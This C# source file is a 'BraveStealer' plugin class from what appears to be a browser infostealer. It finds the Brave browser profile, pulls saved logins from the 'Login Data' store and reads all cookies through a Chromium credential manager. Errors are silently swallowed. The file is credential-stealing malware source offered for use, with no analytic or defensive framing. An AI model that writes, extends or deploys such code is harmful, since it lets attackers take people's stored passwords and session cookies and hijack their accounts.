using System;
using System.Collections.Generic;
using System.IO;

namespace Plugin.Browsers
{
    public class BraveStealer : BrowserBase
    {
        public BraveStealer()
        {
            browserName = "Brave";
            string localAppData = Environment.GetEnvironmentVariable("LOCALAPPDATA");
            profilePath = Path.Combine(localAppData, "BraveSoftware", "Brave-Browser", "User Data");
        }
        
        public override List<SavedLogin> GetPasswords()
        {
            List<SavedLogin> logins = new List<SavedLogin>();
            
            if (!CheckBrowserInstalled())
                return logins;
            
            try
            {
                string loginDataPath = Path.Combine(profilePath, "Default", "Login Data");
                
                if (File.Exists(loginDataPath))
                {
                    // Brave uses Chromium-based structure
                    ChromiumCredentialManager chromiumManager = new ChromiumCredentialManager(profilePath);
                    
                    var chromiumLogins = chromiumManager.GetSavedLogins();
                    foreach (var login in chromiumLogins)
                    {
                        login.Browser = browserName;
                        logins.Add(login);
                    }
                }
            }
            catch { }
            
            return logins;
        }
        
        public override List<Cookie> GetCookies()
        {
            List<Cookie> cookies = new List<Cookie>();
            
            if (!CheckBrowserInstalled())
                return cookies;
            
            try
            {
                ChromiumCredentialManager chromiumManager = new ChromiumCredentialManager(profilePath);
                
                var hostCookies = chromiumManager.GetCookies();
                foreach (var hostCookie in hostCookies)
                {
                    cookies.AddRange(hostCookie.Cookies);
                }
            }
            catch { }
            
            return cookies;
        }
    }
}
